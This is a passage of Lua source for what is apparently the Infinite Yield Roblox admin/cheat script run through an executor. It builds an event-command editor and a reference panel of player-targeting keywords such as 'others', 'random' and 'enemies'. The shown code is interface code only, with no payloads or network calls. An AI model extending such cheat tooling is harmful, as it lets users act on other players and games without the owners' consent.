				{43,"TextLabel",{BackgroundColor3=currentText1,BackgroundTransparency=1,Font=3,Name="EventName",Parent={41},Position=UDim2.new(0,25,0,0),Size=UDim2.new(1,-25,0,20),Text="OnSpawn",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{44,"Frame",{BackgroundColor3=Color3.new(0.19607844948769,0.19607844948769,0.19607844948769),BorderSizePixel=0,BackgroundTransparency=1,ClipsDescendants=true,Name="Cmds",Parent={41},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,1,-20),ZIndex=10,}},
				{45,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),Name="Add",Parent={44},Position=UDim2.new(0,0,1,-20),Size=UDim2.new(1,0,0,20),ZIndex=10,}},
				{46,"TextBox",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={45},PlaceholderColor3=Color3.new(0.7843137383461,0.7843137383461,0.7843137383461),PlaceholderText="Add new command",Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-10,1,0),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{47,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Holder",Parent={44},Size=UDim2.new(1,0,1,-20),ZIndex=10,}},
				{48,"UIListLayout",{Parent={47},SortOrder=2,}},
				{49,"Frame",{currentShade1,BorderSizePixel=0,ClipsDescendants=true,Name="CmdTemplate",Parent={6},Size=UDim2.new(1,0,0,20),Visible=false,ZIndex=10,}},
				{50,"TextBox",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,ClearTextOnFocus=false,Font=3,Parent={49},PlaceholderColor3=Color3.new(1,1,1),Position=UDim2.new(0,5,0,0),Size=UDim2.new(1,-45,0,20),Text="a\\b\\c\\d",TextColor3=currentText1,TextSize=14,TextXAlignment=0,ZIndex=10,}},
				{51,"TextButton",{BackgroundColor3=currentShade1,BorderSizePixel=0,Font=3,Name="Delete",Parent={49},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="X",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
				{52,"TextButton",{BackgroundColor3=currentShade1,BorderSizePixel=0,Font=3,Name="Settings",Parent={49},Position=UDim2.new(1,-40,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=18,ZIndex=10,}},
				{53,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image=getcustomasset("infiniteyield/assets/settings.png"),Parent={52},Position=UDim2.new(0,2,0,2),Size=UDim2.new(0,16,0,16),ZIndex=10,}},
			})
			main.Name = randomString()
			local mainFrame = main:WaitForChild("Content")
			local eventList = mainFrame:WaitForChild("List")
			local eventListHolder = eventList:WaitForChild("Holder")
			local cmdTemplate = mainFrame:WaitForChild("CmdTemplate")
			local eventTemplate = mainFrame:WaitForChild("EventTemplate")
			local settingsFrame = mainFrame:WaitForChild("Settings"):WaitForChild("Slider")
			local settingsTemplates = mainFrame.Settings:WaitForChild("Templates")
			local settingsList = settingsFrame:WaitForChild("List"):WaitForChild("Holder")
			table.insert(shade2,main.TopBar) table.insert(shade1,mainFrame) table.insert(shade2,eventTemplate)
			table.insert(text1,eventTemplate.EventName) table.insert(shade1,eventTemplate.Cmds.Add) table.insert(shade1,cmdTemplate)
			table.insert(text1,cmdTemplate.TextBox) table.insert(shade2,cmdTemplate.Delete) table.insert(shade2,cmdTemplate.Settings)
			table.insert(scroll,mainFrame.List) table.insert(shade1,settingsFrame) table.insert(shade2,settingsFrame.Line)
			table.insert(shade2,settingsFrame.Close) table.insert(scroll,settingsFrame.List) table.insert(shade2,settingsTemplates.DelayEditor.Secs)
			table.insert(text1,settingsTemplates.DelayEditor.Secs) table.insert(text1,settingsTemplates.DelayEditor.Secs.Label) table.insert(text1,settingsTemplates.Players.Title)
			table.insert(shade3,settingsTemplates.Players.CustomButton) table.insert(shade2,settingsTemplates.Players.Custom) table.insert(text1,settingsTemplates.Players.Custom)
			table.insert(shade3,settingsTemplates.Players.Any.Button) table.insert(shade3,settingsTemplates.Players.Me.Button) table.insert(text1,settingsTemplates.Players.Any)
			table.insert(text1,settingsTemplates.Players.Me) table.insert(text1,settingsTemplates.Strings.Title) table.insert(text1,settingsTemplates.Strings.Any)
			table.insert(shade3,settingsTemplates.Strings.Any.Button) table.insert(shade3,settingsTemplates.Strings.CustomButton) table.insert(text1,settingsTemplates.Strings.Custom)
			table.insert(shade2,settingsTemplates.Strings.Custom)
			table.insert(text1,settingsTemplates.Players.Me) table.insert(text1,settingsTemplates.Numbers.Title) table.insert(text1,settingsTemplates.Numbers.Any)
			table.insert(shade3,settingsTemplates.Numbers.Any.Button) table.insert(shade3,settingsTemplates.Numbers.CustomButton) table.insert(text1,settingsTemplates.Numbers.Custom)
			table.insert(shade2,settingsTemplates.Numbers.Custom)
	
			local tweenInf = TweenInfo.new(0.25,Enum.EasingStyle.Quart,Enum.EasingDirection.Out)
	
			local currentlyEditingCmd = nil
	
			settingsFrame:WaitForChild("Close").MouseButton1Click:Connect(function()
				settingsFrame:TweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			end)
	
			local function resizeList()
				local size = 0
	
				for i,v in pairs(eventListHolder:GetChildren()) do
					if v.Name == "EventTemplate" then
						size = size + 20
						if v.Expand.Rotation == 90 then
							size = size + 20*(1+(#events[v.EventName:GetAttribute("RawName")].commands or 0))
						end
					end
				end
	
				TweenService:Create(eventList,tweenInf,{CanvasSize = UDim2.new(0,0,0,size)}):Play()
	
				if size > eventList.AbsoluteSize.Y then
					eventListHolder.Size = UDim2.new(1,-8,1,0)
				else
					eventListHolder.Size = UDim2.new(1,0,1,0)
				end
			end
	
			local function resizeSettingsList()
				local size = 0
	
				for i,v in pairs(settingsList:GetChildren()) do
					if v:IsA("Frame") then
						size = size + v.AbsoluteSize.Y
					end
				end
	
				settingsList.Parent.CanvasSize = UDim2.new(0,0,0,size)
	
				if size > settingsList.Parent.AbsoluteSize.Y then
					settingsList.Size = UDim2.new(1,-8,1,0)
				else
					settingsList.Size = UDim2.new(1,0,1,0)
				end
			end
	
			local function setupCheckbox(button,callback)
				local enabled = button.On.BackgroundTransparency == 0
	
				local function update()
					button.On.BackgroundTransparency = (enabled and 0 or 1)
				end
	
				button.On.MouseButton1Click:Connect(function()
					enabled = not enabled
					update()
					if callback then callback(enabled) end
				end)
	
				return {
					Toggle = function(nocall) enabled = not enabled update() if not nocall and callback then callback(enabled) end end,
					Enable = function(nocall) if enabled then return end enabled = true update()if not nocall and callback then callback(enabled) end end,
					Disable = function(nocall) if not enabled then return end enabled = false update()if not nocall and callback then callback(enabled) end end,
					IsEnabled = function() return enabled end
				}
			end
	
			local function openSettingsEditor(event,cmd)
				currentlyEditingCmd = cmd
	
				for i,v in pairs(settingsList:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
	
				local delayEditor = settingsTemplates.DelayEditor:Clone()
				delayEditor.Secs.FocusLost:Connect(function()
					cmd[3] = tonumber(delayEditor.Secs.Text) or 0
					delayEditor.Secs.Text = cmd[3]
					if onEdited then onEdited() end
				end)
				delayEditor.Secs.Text = cmd[3]
				delayEditor.Visible = true
				table.insert(shade2,delayEditor.Secs)
				table.insert(text1,delayEditor.Secs)
				table.insert(text1,delayEditor.Secs.Label)
				delayEditor.Parent = settingsList
	
				for i,v in pairs(event.sets) do
					if v.Type == "Player" then
						local template = settingsTemplates.Players:Clone()
						template.Title.Text = v.Name or "Player"
	
						local me,any,custom
	
						me = setupCheckbox(template.Me.Button,function(on)
							if not on then return end
							any.Disable()
							custom.Disable()
							cmd[2][i] = 0
							if onEdited then onEdited() end
						end)
	
						any = setupCheckbox(template.Any.Button,function(on)
							if not on then return end
							me.Disable()
							custom.Disable()
							cmd[2][i] = 1
							if onEdited then onEdited() end
						end)
	
						local customTextBox = template.Custom
						custom = setupCheckbox(template.CustomButton,function(on)
							if not on then return end
							me.Disable()
							any.Disable()
							cmd[2][i] = customTextBox.Text
							if onEdited then onEdited() end
						end)
	
						ViewportTextBox.convert(customTextBox)
						customTextBox.FocusLost:Connect(function()
							if custom:IsEnabled() then
								cmd[2][i] = customTextBox.Text
								if onEdited then onEdited() end
							end
						end)
	
						local cVal = cmd[2][i]
						if cVal == 0 then
							me:Enable()
						elseif cVal == 1 then
							any:Enable()
						else
							custom:Enable()
							customTextBox.Text = cVal
						end
	
						template.Visible = true
						table.insert(text1,template.Title)
						table.insert(shade3,template.CustomButton)
						table.insert(shade3,template.Any.Button)
						table.insert(shade3,template.Me.Button)
						table.insert(text1,template.Any)
						table.insert(text1,template.Me)
						template.Parent = settingsList
					elseif v.Type == "String" then
						local template = settingsTemplates.Strings:Clone()
						template.Title.Text = v.Name or "String"
	
						local any,custom
	
						any = setupCheckbox(template.Any.Button,function(on)
							if not on then return end
							custom.Disable()
							cmd[2][i] = 0
							if onEdited then onEdited() end
						end)
	
						local customTextBox = template.Custom
						custom = setupCheckbox(template.CustomButton,function(on)
							if not on then return end
							any.Disable()
							cmd[2][i] = customTextBox.Text
							if onEdited then onEdited() end
						end)
	
						ViewportTextBox.convert(customTextBox)
						customTextBox.FocusLost:Connect(function()
							if custom:IsEnabled() then
								cmd[2][i] = customTextBox.Text
								if onEdited then onEdited() end
							end
						end)
	
						local cVal = cmd[2][i]
						if cVal == 0 then
							any:Enable()
						else
							custom:Enable()
							customTextBox.Text = cVal
						end
	
						template.Visible = true
						table.insert(text1,template.Title)
						table.insert(text1,template.Any)
						table.insert(shade3,template.Any.Button)
						table.insert(shade3,template.CustomButton)
						template.Parent = settingsList
					elseif v.Type == "Number" then
						local template = settingsTemplates.Numbers:Clone()
						template.Title.Text = v.Name or "Number"
	
						local any,custom
	
						any = setupCheckbox(template.Any.Button,function(on)
							if not on then return end
							custom.Disable()
							cmd[2][i] = 0
							if onEdited then onEdited() end
						end)
	
						local customTextBox = template.Custom
						custom = setupCheckbox(template.CustomButton,function(on)
							if not on then return end
							any.Disable()
							cmd[2][i] = customTextBox.Text
							if onEdited then onEdited() end
						end)
	
						ViewportTextBox.convert(customTextBox)
						customTextBox.FocusLost:Connect(function()
							cmd[2][i] = tonumber(customTextBox.Text) or 0
							customTextBox.Text = cmd[2][i]
							if custom:IsEnabled() then
								if onEdited then onEdited() end
							end
						end)
	
						local cVal = cmd[2][i]
						if cVal == 0 then
							any:Enable()
						else
							custom:Enable()
							customTextBox.Text = cVal
						end
	
						template.Visible = true
						table.insert(text1,template.Title)
						table.insert(text1,template.Any)
						table.insert(shade3,template.Any.Button)
						table.insert(shade3,template.CustomButton)
						template.Parent = settingsList
					end
				end
				resizeSettingsList()
				settingsFrame:TweenPosition(UDim2.new(0,0,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
			end
	
			local function defaultSettings(ev)
				local res = {}
	
				for i,v in pairs(ev.sets) do
					if v.Type == "Player" then
						res[#res+1] = v.Default or 0
					elseif v.Type == "String" then
						res[#res+1] = v.Default or 0
					elseif v.Type == "Number" then
						res[#res+1] = v.Default or 0
					end
				end
	
				return res
			end
	
			local function refreshList()
				for i,v in pairs(eventListHolder:GetChildren()) do if v:IsA("Frame") then v:Destroy() end end
	
				for name,event in pairs(events) do
					local eventF = eventTemplate:Clone()
					eventF.EventName.Text = name
					eventF.Visible = true
					eventF.EventName:SetAttribute("RawName", name)
					table.insert(shade2,eventF)
					table.insert(text1,eventF.EventName)
					table.insert(shade1,eventF.Cmds.Add)
	
					local expanded = false
					eventF.Expand.MouseButton1Down:Connect(function()
						expanded = not expanded
						eventF:TweenSize(UDim2.new(1,0,0,20 + (expanded and 20*#eventF.Cmds.Holder:GetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
						eventF.Expand.Rotation = expanded and 90 or 0
						resizeList()
					end)
	
					local function refreshCommands()
						for i,v in pairs(eventF.Cmds.Holder:GetChildren()) do
							if v.Name == "CmdTemplate" then
								v:Destroy()
							end
						end
	
						eventF.EventName.Text = name..(#event.commands > 0 and " ("..#event.commands..")" or "")
	
						for i,cmd in pairs(event.commands) do
							local cmdF = cmdTemplate:Clone()
							local cmdTextBox = cmdF.TextBox
							ViewportTextBox.convert(cmdTextBox)
							cmdTextBox.Text = cmd[1]
							cmdF.Visible = true
							table.insert(shade1,cmdF)
							table.insert(shade2,cmdF.Delete)
							table.insert(shade2,cmdF.Settings)
	
							cmdTextBox.FocusLost:Connect(function()
								event.commands[i] = {cmdTextBox.Text,cmd[2],cmd[3]}
								if onEdited then onEdited() end
							end)
	
							cmdF.Settings.MouseButton1Click:Connect(function()
								openSettingsEditor(event,cmd)
							end)
	
							cmdF.Delete.MouseButton1Click:Connect(function()
								table.remove(event.commands,i)
								refreshCommands()
								resizeList()
	
								if currentlyEditingCmd == cmd then
									settingsFrame:TweenPosition(UDim2.new(0,-150,0,0),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
								end
								if onEdited then onEdited() end
							end)
	
							cmdF.Parent = eventF.Cmds.Holder
						end
	
						eventF:TweenSize(UDim2.new(1,0,0,20 + (expanded and 20*#eventF.Cmds.Holder:GetChildren() or 0)),Enum.EasingDirection.Out,Enum.EasingStyle.Quart,0.25,true)
					end
	
					local newBox = eventF.Cmds.Add.TextBox
					ViewportTextBox.convert(newBox)
					newBox.FocusLost:Connect(function(enter)
						if enter then
							event.commands[#event.commands+1] = {newBox.Text,defaultSettings(event),0}
							newBox.Text = ""
	
							refreshCommands()
							resizeList()
							if onEdited then onEdited() end
						end
					end)
	
					--eventF:GetPropertyChangedSignal("AbsoluteSize"):Connect(resizeList)
	
					eventF.Parent = eventListHolder
	
					refreshCommands()
				end
	
				resizeList()
			end
	
			local function saveData()
				local result = {}
				for i,v in pairs(events) do
					result[i] = v.commands
				end
				return HttpService:JSONEncode(result)
			end
	
			local function loadData(str)
				local data = HttpService:JSONDecode(str)
				for i,v in pairs(data) do
					if events[i] then
						events[i].commands = v
					end
				end
			end
	
			local function addCmd(event,data)
				table.insert(events[event].commands,data)
			end
	
			local function setOnEdited(f)
				if type(f) == "function" then
					onEdited = f
				end
			end
	
			main.TopBar.Close.MouseButton1Click:Connect(function()
				main:TweenPosition(UDim2.new(0.5,-175,0,-500), "InOut", "Quart", 0.5, true, nil)
			end)
			dragGUI(main)
			main.Parent = ScaledHolder
	
			return {
				RegisterEvent = registerEvent,
				FireEvent = fireEvent,
				Refresh = refreshList,
				SaveData = saveData,
				LoadData = loadData,
				AddCmd = addCmd,
				Frame = main,
				SetOnEdited = setOnEdited
			}
		end)()
	
		reference = (function()
			local main = create({
				{1,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,Name="Main",Position=UDim2.new(0.5,-250,0,-500),Size=UDim2.new(0,500,0,20),ZIndex=10,}},
				{2,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="TopBar",Parent={1},Size=UDim2.new(1,0,0,20),ZIndex=10,}},
				{3,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Title",Parent={2},Size=UDim2.new(1,0,0.94999998807907,0),Text="Reference",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
				{4,"TextButton",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Close",Parent={2},Position=UDim2.new(1,-20,0,0),Size=UDim2.new(0,20,0,20),Text="",TextColor3=Color3.new(1,1,1),TextSize=14,ZIndex=10,}},
				{5,"ImageLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Image=getcustomasset("infiniteyield/assets/close.png"),Parent={4},Position=UDim2.new(0,5,0,5),Size=UDim2.new(0,10,0,10),ZIndex=10,}},
				{6,"Frame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BorderSizePixel=0,Name="Content",Parent={1},Position=UDim2.new(0,0,0,20),Size=UDim2.new(1,0,0,300),ZIndex=10,}},
				{7,"ScrollingFrame",{BackgroundColor3=Color3.new(0.14117647707462,0.14117647707462,0.14509804546833),BackgroundTransparency=1,BorderColor3=Color3.new(0.15686275064945,0.15686275064945,0.15686275064945),BorderSizePixel=0,BottomImage="rbxasset://textures/ui/Scroll/scroll-middle.png",CanvasSize=UDim2.new(0,0,0,1313),Name="List",Parent={6},ScrollBarImageColor3=Color3.new(0.30588236451149,0.30588236451149,0.3098039329052),ScrollBarThickness=8,Size=UDim2.new(1,0,1,0),TopImage="rbxasset://textures/ui/Scroll/scroll-middle.png",VerticalScrollBarInset=2,ZIndex=10,}},
				{8,"UIListLayout",{Parent={7},SortOrder=2,}},
				{9,"Frame",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Name="Section",Parent={7},Size=UDim2.new(1,0,0,429),ZIndex=10,}},
				{10,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="Header",Parent={9},Position=UDim2.new(0,8,0,5),Size=UDim2.new(1,-8,0,20),Text="Special Player Cases",TextColor3=Color3.new(1,1,1),TextSize=20,TextXAlignment=0,ZIndex=10,}},
				{11,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="Text",Parent={9},Position=UDim2.new(0,8,0,25),Size=UDim2.new(1,-8,0,20),Text="These keywords can be used to quickly select groups of players in commands:",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{12,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BorderSizePixel=0,Name="Line",Parent={9},Position=UDim2.new(0,10,1,-1),Size=UDim2.new(1,-20,0,1),ZIndex=10,}},
				{13,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Cases",Parent={9},Position=UDim2.new(0,8,0,55),Size=UDim2.new(1,-16,0,342),ZIndex=10,}},
				{14,"UIListLayout",{Parent={13},SortOrder=2,}},
				{15,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,LayoutOrder=-4,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{16,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={15},Size=UDim2.new(1,0,1,0),Text="all",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{17,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={15},Position=UDim2.new(0,15,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{18,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,LayoutOrder=-3,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{19,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={18},Size=UDim2.new(1,0,1,0),Text="others",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{20,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={18},Position=UDim2.new(0,37,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone except you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{21,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,LayoutOrder=-2,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{22,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={21},Size=UDim2.new(1,0,1,0),Text="me",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{23,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={21},Position=UDim2.new(0,19,0,0),Size=UDim2.new(1,0,1,0),Text="- includes your player only",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{24,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{25,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={24},Size=UDim2.new(1,0,1,0),Text="#[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{26,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={24},Position=UDim2.new(0,59,0,0),Size=UDim2.new(1,0,1,0),Text="- gets a specified amount of random players",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{27,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{28,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={27},Size=UDim2.new(1,0,1,0),Text="random",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{29,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={27},Position=UDim2.new(0,44,0,0),Size=UDim2.new(1,0,1,0),Text="- affects a random player",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{30,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{31,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={30},Size=UDim2.new(1,0,1,0),Text="%[team name]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{32,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={30},Position=UDim2.new(0,78,0,0),Size=UDim2.new(1,0,1,0),Text="- includes everyone on a given team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{33,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{34,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={33},Size=UDim2.new(1,0,1,0),Text="allies / team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{35,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={33},Position=UDim2.new(0,63,0,0),Size=UDim2.new(1,0,1,0),Text="- players who are on your team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{36,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{37,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={36},Size=UDim2.new(1,0,1,0),Text="enemies / nonteam",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{38,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={36},Position=UDim2.new(0,101,0,0),Size=UDim2.new(1,0,1,0),Text="- players who are not on your team",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{39,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{40,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={39},Size=UDim2.new(1,0,1,0),Text="friends",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{41,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={39},Position=UDim2.new(0,40,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone who is friends with you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{42,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{43,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={42},Size=UDim2.new(1,0,1,0),Text="nonfriends",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{44,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={42},Position=UDim2.new(0,61,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone who is not friends with you",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{45,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{46,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={45},Size=UDim2.new(1,0,1,0),Text="guests",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{47,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={45},Position=UDim2.new(0,36,0,0),Size=UDim2.new(1,0,1,0),Text="- guest players (obsolete)",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{48,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{49,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={48},Size=UDim2.new(1,0,1,0),Text="bacons",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{50,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=3,Name="CaseDesc",Parent={48},Position=UDim2.new(0,40,0,0),Size=UDim2.new(1,0,1,0),Text="- anyone with the \"bacon\" or pal hair",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
				{51,"Frame",{BackgroundColor3=Color3.new(0.1803921610117,0.1803921610117,0.1843137294054),BackgroundTransparency=1,BorderSizePixel=0,Name="Case",Parent={13},Position=UDim2.new(0,8,0,60),Size=UDim2.new(1,0,0,18),ZIndex=10,}},
				{52,"TextLabel",{BackgroundColor3=Color3.new(1,1,1),BackgroundTransparency=1,Font=4,Name="CaseName",Parent={51},Size=UDim2.new(1,0,1,0),Text="age[number]",TextColor3=Color3.new(1,1,1),TextSize=14,TextWrapped=true,TextXAlignment=0,ZIndex=10,}},
